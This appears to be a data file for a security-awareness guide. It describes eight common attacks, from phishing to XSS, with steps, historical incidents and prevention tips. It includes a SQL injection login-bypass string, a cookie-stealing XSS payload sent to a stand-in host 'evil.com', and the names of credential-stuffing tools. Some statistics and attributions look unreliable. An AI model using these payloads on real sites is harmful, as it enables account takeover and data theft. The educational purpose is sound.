name: Phishing
short: Deceptive emails impersonating trusted entities to steal credentials or install malware.
description: Phishing is the most prevalent cyber attack vector, responsible for over 80% of reported security incidents. Attackers craft convincing emails mimicking banks, tech companies, or internal IT departments to trick users into revealing passwords, clicking malicious links, or downloading malware.
how_it_works: Attacker registers a lookalike domain (paypa1.com vs paypal.com)
Crafts HTML email matching real brand design
Sends to thousands or targeted individuals
Victim clicks link → lands on fake login page
Credentials captured and sent to attacker
real_examples: 2016 DNC Hack — spear phishing email compromised John Podesta's Gmail
2020 Twitter Bitcoin Scam — phishing internal staff to access admin tools

name: Spear Phishing
short: Highly targeted phishing using personal information to appear legitimate.
description: Unlike mass phishing, spear phishing targets specific individuals using researched personal details from LinkedIn, social media, or data breaches. A spear phishing email to a CFO might reference a real colleague, recent project, or internal system — making it extremely convincing.
how_it_works: Attacker researches target on LinkedIn, company website, social media
Collects names of colleagues, managers, project names
Crafts highly personalized email with real context
Target trusts email due to specific details
Malicious payload delivered
real_examples: 2014 Sony Pictures Hack — spear phishing led to massive data breach
Operation Aurora (Google, 2010) — targeted engineers via personal email
prevention: Be skeptical of emails referencing personal details
Never wire money based solely on email

name: Ransomware
short: Malware that encrypts victim data and demands cryptocurrency payment for decryption.
description: Ransomware encrypts files on infected systems, rendering them inaccessible. Attackers demand payment — usually in Bitcoin — for the decryption key. Modern ransomware also exfiltrates data before encryption for double extortion: pay or we publish your data.
how_it_works: Delivered via phishing email attachment or malicious download
Executes and scans for valuable files
Encrypts files using asymmetric encryption
Displays ransom note with payment instructions
Attacker may or may not provide decryption key after payment
real_examples: Colonial Pipeline (2021) — $4.4M ransom, US fuel supply disrupted

name: Man-in-the-Middle
short: Intercepting communication between two parties to eavesdrop or alter data.
description: In a MitM attack, an attacker positions themselves between the victim and a legitimate service. They can read, modify, or inject data into the communication stream. Common on public WiFi where attackers use ARP poisoning or rogue access points.
how_it_works: Attacker sets up rogue WiFi hotspot or uses ARP poisoning
Victim connects, routing traffic through attacker
Attacker intercepts HTTP traffic in plaintext
SSL stripping downgrades HTTPS to HTTP
Credentials, session tokens captured
real_examples: 2011 DigiNotar CA Compromise — enabled MitM attacks on 300,000 Iranian Gmail users
Superfish (2015) — Lenovo pre-installed adware enabling MitM on HTTPS
prevention: Avoid public WiFi for sensitive tasks
Verify certificates manually for critical systems

name: SQL Injection
short: Injecting malicious SQL code into input fields to manipulate or dump databases.
description: SQL injection occurs when user input is directly concatenated into SQL queries without sanitization. Attackers can bypass login, dump entire databases, modify records, or execute commands on the server. Despite being well-known, SQLi remains in OWASP Top 3.
how_it_works: Attacker finds input field that queries a database
Inputs SQL syntax: ' OR '1'='1' --
Application concatenates input directly into query
Modified query returns unintended data or bypasses auth
Advanced: UNION attacks dump entire tables
real_examples: Heartland Payment Systems (2008) — 130M credit cards stolen via SQLi
7-Eleven Japan (2019) — ¥500M stolen via SQLi in mobile app

name: Credential Stuffing
short: Using leaked username/password pairs from one breach to attack other services.
description: Billions of credential pairs from past breaches are freely available on dark web markets. Attackers automate login attempts across hundreds of services, exploiting password reuse. If you use the same password on Netflix and your bank, one breach means both are compromised.
how_it_works: Attacker obtains leaked credential database (e.g., from dark web)
Uses automated tools (Sentry MBA, OpenBullet)
Tests credentials against target login pages at scale
Successful logins = compromised accounts
Accounts sold, used for fraud, or held for ransom
real_examples: Spotify (2020) — 350,000 accounts compromised via credential stuffing
Zoom (2020) — 500,000 accounts sold on dark web
prevention: Use unique passwords for every site

name: Cross-Site Scripting (XSS)
short: Injecting malicious scripts into web pages viewed by other users.
description: XSS allows attackers to inject client-side scripts into web pages. When other users visit the page, the malicious script executes in their browser — stealing session cookies, redirecting to phishing pages, or performing actions on their behalf.
how_it_works: Attacker finds input that renders unsanitized HTML
Injects: <script>document.location='evil.com?c='+document.cookie</script>
Script stored in database (Stored XSS) or in URL (Reflected XSS)
Victim visits page → script executes in their browser
Session token sent to attacker → account takeover
real_examples: Samy Worm (2005) — MySpace XSS infected 1M profiles in 20 hours
British Airways (2018) — XSS used to skim payment card data of 380,000 customers
prevention: Use modern frameworks (React, Angular) that auto-escape

name: Vishing & Smishing
short: Voice calls (vishing) and SMS messages (smishing) used to trick victims into revealing data.
description: Voice phishing (vishing) involves attackers calling victims while impersonating banks, government agencies, or tech support. SMS phishing (smishing) uses text messages with malicious links. Both exploit the immediacy and trust associated with direct communication.
how_it_works: Attacker spoofs caller ID to show legitimate bank number
Claims suspicious activity on your account
Pressures victim to 'verify' account details
Captures card numbers, OTP codes, passwords
Or: SMS with fake delivery link to steal credentials
real_examples: IRS Vishing Scam — billions lost annually by US taxpayers
FluBot (2021) — smishing campaign spreading Android malware via fake delivery SMS
prevention: Never give credentials over the phone — hang up and call back official number
Register for Do Not Call lists
Be suspicious of any unsolicited contact
Banks never ask for full passwords by phone
